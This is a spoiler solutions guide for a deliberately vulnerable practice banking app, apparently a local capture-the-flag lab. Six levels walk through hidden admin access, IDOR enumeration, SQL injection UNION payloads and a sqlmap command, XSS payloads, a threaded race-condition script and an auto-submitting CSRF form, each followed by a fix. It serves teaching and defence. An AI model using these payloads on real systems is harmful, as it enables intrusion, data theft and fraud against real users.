# Solutions (spoilers!)

## hidden_admin - Level 1

**Vulnerability:** the admin panel is "protected" only by not being linked anywhere
(security through obscurity). It has no authentication or authorization check.

1. Register an account. You start with $100.
2. Find the hidden path. Brute-forcing with a default wordlist (dirb's `common.txt`,
   gobuster/ffuf/feroxbuster with the same list) **won't find it** - `admin_manage` isn't a
   common wordlist word. Check `robots.txt` instead:
   ```bash
   curl http://127.0.0.1:5000/robots.txt
   ```
   which shows `Disallow: /admin_manage` - the lesson here is that `robots.txt` is itself a
   reconnaissance source, separate from wordlist brute-forcing, and sites sometimes list the
   very paths they're trying to hide.
3. Open `/admin_manage`. It works even when you're logged out.
4. Use "Manual balance adjustment" to credit your user with at least $1,900.
   With curl (the first user you register after starting the app gets id 6; accounts 1-5 are seeded -
   see the "Seed accounts" section of the README):
   ```bash
   curl -X POST http://127.0.0.1:5000/admin_manage/adjust -d user_id=6 -d amount=1900
   ```
5. Reload your dashboard to see the flag.

**Fix (see `secure` mode):** check on the server that the user is logged in **and** is an admin
for every admin route. Return 404 instead of 403 if you also want to hide that the panel exists.

## idor - Level 2

**Vulnerability:** Insecure Direct Object Reference. The statement page at
`/account/<id>/statement` takes the account id from the URL and never checks that it
belongs to the logged-in user.

1. Register and log in. Your dashboard shows "Checking account #6".
2. Click "Full statement". The URL is `/account/6/statement`.
3. Change the number. Accounts 1-3 are admin, alice and bob. Account 4 is
   "Richard Vance (VIP)" with $1.25M. Account 5 (`nora`) is just another customer here -
   she matters in a later level.
4. His statement has a memo `Safe deposit box #7 rental, code: L2P{...}`. That's the flag.

Enumerating with Burp Intruder or ffuf (copy your `session` cookie from the browser):
```bash
ffuf -u http://127.0.0.1:5000/account/FUZZ/statement -w <(seq 1 50) -b "session=<your cookie>" -mc 200
```

**Fix (see `secure` mode):** authorize every object access on the server. Check that the
account belongs to the current user (or that the user is an admin), and return 404 otherwise.
Random account ids (UUIDs) make guessing harder but are **not** a fix on their own.

## sqli - Level 3

**Vulnerability:** the transaction search (`/transactions?q=...`) pastes your search term
straight into the SQL query, and shows database errors on the page:

```sql
... WHERE (t.from_user = 5 OR t.to_user = 5) AND t.memo LIKE '%<q>%' ORDER BY t.id DESC
```

1. **Confirm it.** Search for `'`. You get `Database error: unrecognized token ...`.
   `' OR 1=1--` shows every customer's transactions, not just yours.
2. **Count the columns.** `' ORDER BY 8--` works, `' ORDER BY 9--` errors, so there are 8.
   (Or try `' UNION SELECT 1,2,3,4,5,6,7,8--` and add/remove numbers until it stops erroring.)
3. **See which columns show up.** `' UNION SELECT 1,2,3,4,5,6,7,8--` adds a row with
   `2` in Date and `7` in Memo (Amount shows `-$0.08`, because column 8 is treated as cents).
   Column 7 (Memo) is the best place for text.
4. **List the tables.** SQLite keeps them in `sqlite_master`:
   ```
   ' UNION SELECT 1,2,3,4,5,6,name||' :: '||sql,8 FROM sqlite_master WHERE type='table'--
   ```
   You'll find `bank_vault (id, label, secret)`.
5. **Dump the vault:**
   ```
   ' UNION SELECT 1,2,3,4,5,6,label||' = '||secret,8 FROM bank_vault--
   ```
   `vault_master_code = L2P{...}` is the flag.

Bonus: `' UNION SELECT 1,2,3,4,5,6,username||':'||password_hash,8 FROM users--` dumps the
password hashes.

With sqlmap (copy your `session` cookie from the browser):
```bash
sqlmap -u "http://127.0.0.1:5000/transactions?q=x" --cookie="session=<your cookie>" -T bank_vault --dump
```

**Fix (see `secure` mode):** never build SQL with string formatting. Use parameterized
queries (`LIKE ?` with the value passed separately), and don't show raw database errors
to users.

## xss - Level 4

**Vulnerability:** the transaction search (`/transactions?q=...`) reflects your search term
back into the page without HTML-escaping, letting you inject arbitrary HTML and JavaScript.

1. **Confirm it.** Go to `/transactions?q=<b>hello</b>`. The word "hello" appears **bold** in the
   results line. That means HTML is being rendered, not escaped.
2. **Pop an alert.** Try:
   ```
   /transactions?q=<script>alert(1)</script>
   ```
   An alert box fires — you have XSS.
3. **Find the flag.** View the page source (`Ctrl+U`). Near the top you'll find:
   ```html
   <script>/* bank internal - do not share */ var XSS_FLAG = "L2P{...}";</script>
   ```
4. **Read the flag with XSS.** Use your injection to execute that variable:
   ```
   /transactions?q=<script>alert(XSS_FLAG)</script>
   ```
   The flag appears in the alert. Alternatively, use `<img src=x onerror=alert(XSS_FLAG)>`
   to trigger execution via an attribute event handler instead of a `<script>` tag.

**Fix (see `secure` mode):** never render user input as raw HTML. Jinja2 auto-escapes
`{{ q }}` by default; using `{{ q | safe }}` deliberately disables that protection.
In a real app, also set a strict `Content-Security-Policy` header to block inline scripts.

## race - Level 5

**Vulnerability:** `/transfer` checks your balance, then (after an artificial 0.2s delay
that exists to make the bug reliably exploitable over HTTP) writes back
`stale_balance - amount` instead of re-checking and decrementing atomically. Fire several
transfers at once and every one of them can read the *same* starting balance before any of
them has written back a lower number - a textbook TOCTOU / "lost update" bug. The recipient
is credited in full for each one that gets through, so money is created from nothing.

1. Register two accounts: `me` (keeps its $100) and `mule` (where the money piles up).
   Log in as `me` and grab its session cookie (e.g. from devtools, or a `requests.Session`).
2. Fire several transfers of $100 from `me` to `mule` **at the same time**, not one after
   another - that's the whole trick. Every mode except `csrf` requires the hidden
   `csrf_token` field from the dashboard's transfer form, so grab that once and reuse it
   for every request (it's tied to your session, not single-use):
   ```python
   import re, requests, threading
   s = requests.Session()
   s.post("http://127.0.0.1:5000/login", data={"username": "me", "password": "secret1"})
   token = re.search(r'name="csrf_token" value="([^"]+)"', s.get("http://127.0.0.1:5000/dashboard").text)[1]

   def send():
       s.post("http://127.0.0.1:5000/transfer", data={"to": "mule", "amount": "100", "csrf_token": token})

   threads = [threading.Thread(target=send) for _ in range(6)]
   [t.start() for t in threads]
   [t.join() for t in threads]
   ```
   Or with curl, launched in the background so they overlap (fetch the token the same way
   from a logged-in `curl -c cookies.txt` request to `/dashboard` first):
   ```bash
   for i in 1 2 3 4 5 6; do
     curl -s -b cookies.txt -X POST http://127.0.0.1:5000/transfer \
       -d to=mule -d amount=100 -d csrf_token="$TOKEN" &
   done; wait
   ```
3. `me`'s balance check passes for every request (each sees the original $100 before any
   write lands), so several of the six transfers go through. `mule` ends up with far more
   than the $100 that ever really existed; `me`'s balance can even go negative.
4. Log in as `mule`. Once its balance is $500 or more, the flag appears on the dashboard.
   If one run doesn't get enough transfers through, repeat it, or launch more at once -
   the 0.2s delay gives a wide window, but thread scheduling isn't guaranteed.

**Fix (see `secure` mode):** make the check-and-decrement one atomic statement instead of
a separate read then write:
```sql
UPDATE users SET balance_cents = balance_cents - ? WHERE id = ? AND balance_cents >= ?
```
If no row matches (balance was already too low by the time this runs), `rowcount` is 0 and
the transfer is rejected - there's no window between checking and spending for a second
request to sneak into. The same pattern (a conditional, single-statement update) is the
standard fix for this whole class of bug in any relational database.

## csrf - Level 6

**Vulnerability:** `/transfer` never checks a CSRF token in this mode (every other mode
does). A form hosted on *any* site can POST to it, and the browser will automatically
attach the victim's session cookie, because cookies are sent based on which site the
*request* targets, not which site served the page making it. The server can't tell that
request apart from one the victim meant to submit herself.

1. Register your own account (so you have a username to receive the stolen money) and open
   the **CSRF Lab** page from the nav bar. It shows Nora Kessler's balance ($3,000 to start)
   - you can watch it change as you attack her.
2. Copy the starter PoC shown on that page into a file named `exploit.html`. Change
   `YOUR_USERNAME_HERE` to your own username. It's a form that auto-submits itself on load:
   ```html
   <form id="csrf-form" action="http://127.0.0.1:5000/transfer" method="POST">
     <input type="hidden" name="to" value="YOUR_USERNAME_HERE">
     <input type="hidden" name="amount" value="1000">
     <input type="hidden" name="memo" value="gift">
   </form>
   <script>document.getElementById("csrf-form").submit();</script>
   ```
   Notice what's missing: no `csrf_token` field, because you have no way to read one out of
   Nora's session from a different origin. That's exactly the bug this mode leaves open.
3. Host it somewhere that's a genuinely different origin from the bank - a different port
   on this machine, or (closer to a real attack) a whole separate VM on the same lab
   subnet, like an attack box:
   ```bash
   python3 -m http.server 8000
   ```
   The bot will fetch from localhost or any private-network address (10.x/172.16.x/192.168.x),
   but refuses the public internet - keeps this a safe, self-contained exercise either way.
4. Back in the CSRF Lab page, paste `http://127.0.0.1:8000/exploit.html` (or your attack
   box's address, e.g. `http://192.168.56.10:8000/exploit.html`) and click
   **Deliver to victim**. This runs a small bot that logs in as Nora for real over HTTP
   (simulating her browser already being logged in), fetches your page, and submits
   whatever form it finds there - carrying her session cookie, exactly like a real browser
   would if she'd opened your link.
5. The report shows the bot's HTTP requests and Nora's new balance. Reload your own
   dashboard: once your balance passes $1,000 (your starting $100 plus her stolen $1,000),
   the flag appears.

A real attack wouldn't need a lab button - you'd just get the victim to open the page (a
link in an email, an ad, a forum post with an `<img>`-sized iframe). The bot here stands in
for that click, using a real second HTTP session so the whole chain - login, page fetch,
forged submission - genuinely happens, nothing is faked.

**Why this needs a dedicated CSRF token (not just checking the `Referer`/`Origin` header,
and not just relying on cookies):** modern browsers send `SameSite=Lax` cookies by default,
which already blocks a lot of basic cross-site POST forgery - this lab models the
underlying logic flaw (no server-side proof the request came from your own site) that
`SameSite` alone doesn't fully close (subdomains, misconfigured cookies, and older or
embedded browsers can still be exposed). Defense in depth still wants a real token.

**Fix (see `secure` mode):** generate a random, per-session token, embed it as a hidden
field in every state-changing form, and reject the request if the submitted token doesn't
match the one tied to the user's session (`app.py`'s `get_csrf_token()` /
`session.get("csrf_token")` check in `transfer()`). An attacker's page can forge the
request's other fields, but can't read your session to put the right token in it. Real
apps usually get this via a framework (e.g. Flask-WTF's `CSRFProtect`) rather than
hand-rolling it.
